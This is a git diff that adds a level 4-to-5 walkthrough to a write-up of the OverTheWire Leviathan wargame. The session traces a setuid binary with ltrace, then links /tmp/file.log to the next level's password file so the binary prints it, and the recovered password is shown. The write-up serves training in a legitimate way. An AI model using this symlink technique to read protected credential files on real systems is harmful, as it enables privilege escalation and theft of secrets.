@@ -286,3 +286,161 @@ for bits in binary_bit_list:
 
 print(res)
 ```
+
+
+## 4->5
+This level uses `ltrace` with `ln -s`.
+
+```bash
+leviathan5@gibson:~$ ls -alh
+total 36K
+drwxr-xr-x  2 root       root       4.0K Apr 10 14:23 .
+drwxr-xr-x 83 root       root       4.0K Apr 10 14:24 ..
+-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan6 leviathan5  15K Apr 10 14:23 leviathan5
+-rw-r--r--  1 root       root        807 Mar 31  2024 .profile
+leviathan5@gibson:~$ file leviathan5 
+leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0fbe5a715bf8cd28d02bc0e989a37f9c0ab21614, for GNU/Linux 3.2.0, not stripped
+leviathan5@gibson:~$ ./leviathan5 
+Cannot find /tmp/file.log
+leviathan5@gibson:~$ ltrace ./leviathan5 
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                       = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                                 = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+leviathan5@gibson:~$ touch /tmp/file.log
+leviathan5@gibson:~$ ltrace ./leviathan5 
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                       = 0x804d1a0
+fgetc(0x804d1a0)                                                                  = '\377'
+feof(0x804d1a0)                                                                   = 1
+fclose(0x804d1a0)                                                                 = 0
+getuid()                                                                          = 12005
+setuid(12005)                                                                     = 0
+unlink("/tmp/file.log")                                                           = 0
++++ exited (status 0) +++
+leviathan5@gibson:~$ echo "cat /etc/leviathan_pass/leviathan6" > /tmp/file.log
+leviathan5@gibson:~$ ltrace ./leviathan5 
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                       = 0x804d1a0
+fgetc(0x804d1a0)                                                                  = 'c'
+feof(0x804d1a0)                                                                   = 0
+putchar(99, 0x804a008, 0, 0)                                                      = 99
+fgetc(0x804d1a0)                                                                  = 'a'
+feof(0x804d1a0)                                                                   = 0
+putchar(97, 0x804a008, 0, 0)                                                      = 97
+fgetc(0x804d1a0)                                                                  = 't'
+feof(0x804d1a0)                                                                   = 0
+putchar(116, 0x804a008, 0, 0)                                                     = 116
+fgetc(0x804d1a0)                                                                  = ' '
+feof(0x804d1a0)                                                                   = 0
+putchar(32, 0x804a008, 0, 0)                                                      = 32
+fgetc(0x804d1a0)                                                                  = '/'
+feof(0x804d1a0)                                                                   = 0
+putchar(47, 0x804a008, 0, 0)                                                      = 47
+fgetc(0x804d1a0)                                                                  = 'e'
+feof(0x804d1a0)                                                                   = 0
+putchar(101, 0x804a008, 0, 0)                                                     = 101
+fgetc(0x804d1a0)                                                                  = 't'
+feof(0x804d1a0)                                                                   = 0
+putchar(116, 0x804a008, 0, 0)                                                     = 116
+fgetc(0x804d1a0)                                                                  = 'c'
+feof(0x804d1a0)                                                                   = 0
+putchar(99, 0x804a008, 0, 0)                                                      = 99
+fgetc(0x804d1a0)                                                                  = '/'
+feof(0x804d1a0)                                                                   = 0
+putchar(47, 0x804a008, 0, 0)                                                      = 47
+fgetc(0x804d1a0)                                                                  = 'l'
+feof(0x804d1a0)                                                                   = 0
+putchar(108, 0x804a008, 0, 0)                                                     = 108
+fgetc(0x804d1a0)                                                                  = 'e'
+feof(0x804d1a0)                                                                   = 0
+putchar(101, 0x804a008, 0, 0)                                                     = 101
+fgetc(0x804d1a0)                                                                  = 'v'
+feof(0x804d1a0)                                                                   = 0
+putchar(118, 0x804a008, 0, 0)                                                     = 118
+fgetc(0x804d1a0)                                                                  = 'i'
+feof(0x804d1a0)                                                                   = 0
+putchar(105, 0x804a008, 0, 0)                                                     = 105
+fgetc(0x804d1a0)                                                                  = 'a'
+feof(0x804d1a0)                                                                   = 0
+putchar(97, 0x804a008, 0, 0)                                                      = 97
+fgetc(0x804d1a0)                                                                  = 't'
+feof(0x804d1a0)                                                                   = 0
+putchar(116, 0x804a008, 0, 0)                                                     = 116
+fgetc(0x804d1a0)                                                                  = 'h'
+feof(0x804d1a0)                                                                   = 0
+putchar(104, 0x804a008, 0, 0)                                                     = 104
+fgetc(0x804d1a0)                                                                  = 'a'
+feof(0x804d1a0)                                                                   = 0
+putchar(97, 0x804a008, 0, 0)                                                      = 97
+fgetc(0x804d1a0)                                                                  = 'n'
+feof(0x804d1a0)                                                                   = 0
+putchar(110, 0x804a008, 0, 0)                                                     = 110
+fgetc(0x804d1a0)                                                                  = '_'
+feof(0x804d1a0)                                                                   = 0
+putchar(95, 0x804a008, 0, 0)                                                      = 95
+fgetc(0x804d1a0)                                                                  = 'p'
+feof(0x804d1a0)                                                                   = 0
+putchar(112, 0x804a008, 0, 0)                                                     = 112
+fgetc(0x804d1a0)                                                                  = 'a'
+feof(0x804d1a0)                                                                   = 0
+putchar(97, 0x804a008, 0, 0)                                                      = 97
+fgetc(0x804d1a0)                                                                  = 's'
+feof(0x804d1a0)                                                                   = 0
+putchar(115, 0x804a008, 0, 0)                                                     = 115
+fgetc(0x804d1a0)                                                                  = 's'
+feof(0x804d1a0)                                                                   = 0
+putchar(115, 0x804a008, 0, 0)                                                     = 115
+fgetc(0x804d1a0)                                                                  = '/'
+feof(0x804d1a0)                                                                   = 0
+putchar(47, 0x804a008, 0, 0)                                                      = 47
+fgetc(0x804d1a0)                                                                  = 'l'
+feof(0x804d1a0)                                                                   = 0
+putchar(108, 0x804a008, 0, 0)                                                     = 108
+fgetc(0x804d1a0)                                                                  = 'e'
+feof(0x804d1a0)                                                                   = 0
+putchar(101, 0x804a008, 0, 0)                                                     = 101
+fgetc(0x804d1a0)                                                                  = 'v'
+feof(0x804d1a0)                                                                   = 0
+putchar(118, 0x804a008, 0, 0)                                                     = 118
+fgetc(0x804d1a0)                                                                  = 'i'
+feof(0x804d1a0)                                                                   = 0
+putchar(105, 0x804a008, 0, 0)                                                     = 105
+fgetc(0x804d1a0)                                                                  = 'a'
+feof(0x804d1a0)                                                                   = 0
+putchar(97, 0x804a008, 0, 0)                                                      = 97
+fgetc(0x804d1a0)                                                                  = 't'
+feof(0x804d1a0)                                                                   = 0
+putchar(116, 0x804a008, 0, 0)                                                     = 116
+fgetc(0x804d1a0)                                                                  = 'h'
+feof(0x804d1a0)                                                                   = 0
+putchar(104, 0x804a008, 0, 0)                                                     = 104
+fgetc(0x804d1a0)                                                                  = 'a'
+feof(0x804d1a0)                                                                   = 0
+putchar(97, 0x804a008, 0, 0)                                                      = 97
+fgetc(0x804d1a0)                                                                  = 'n'
+feof(0x804d1a0)                                                                   = 0
+putchar(110, 0x804a008, 0, 0)                                                     = 110
+fgetc(0x804d1a0)                                                                  = '6'
+feof(0x804d1a0)                                                                   = 0
+putchar(54, 0x804a008, 0, 0)                                                      = 54
+fgetc(0x804d1a0)                                                                  = '\n'
+feof(0x804d1a0)                                                                   = 0
+putchar(10, 0x804a008, 0, 0cat /etc/leviathan_pass/leviathan6
+)                                                      = 10
+fgetc(0x804d1a0)                                                                  = '\377'
+feof(0x804d1a0)                                                                   = 1
+fclose(0x804d1a0)                                                                 = 0
+getuid()                                                                          = 12005
+setuid(12005)                                                                     = 0
+unlink("/tmp/file.log")                                                           = 0
++++ exited (status 0) +++
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@gibson:~$ ./leviathan5
+szo7HDB88w
+```
+
